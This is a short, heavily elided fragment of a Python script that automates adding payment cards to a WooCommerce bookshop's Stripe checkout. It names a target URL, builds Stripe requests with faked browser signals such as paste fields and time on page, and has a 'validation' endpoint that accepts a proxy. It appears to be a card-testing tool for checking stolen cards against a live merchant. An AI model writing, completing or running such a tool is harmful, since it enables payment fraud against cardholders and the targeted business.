...
# CONFIGURATION
# ========================================
BASE_URL = "https://grovebooks.co.uk"
CARD_COUNTRY = "UK"
...
class PaymentMethodAdder:
    """Handles the complete flow of adding payment methods to WooCommerce for GroveBooks"""
    ...
    def create_stripe_payment_method(self, card_data):
        ...
        data = (
            ...
            f"&pasted_fields=number&payment_user_agent=stripe.js%2F619294786c%3B+stripe-js-v3%2F619294786c%3B+payment-element%3B+deferred-intent%3B+autopm"
            f"&referrer={self.base_url}&time_on_page=15678&key={self.stripe_key}&_stripe_version=2024-06-20"
        )
...
def handle_endpoint(auth, proxy=None):
    """Main endpoint handler for GroveBooks registration-based validation"""
    if not auth:
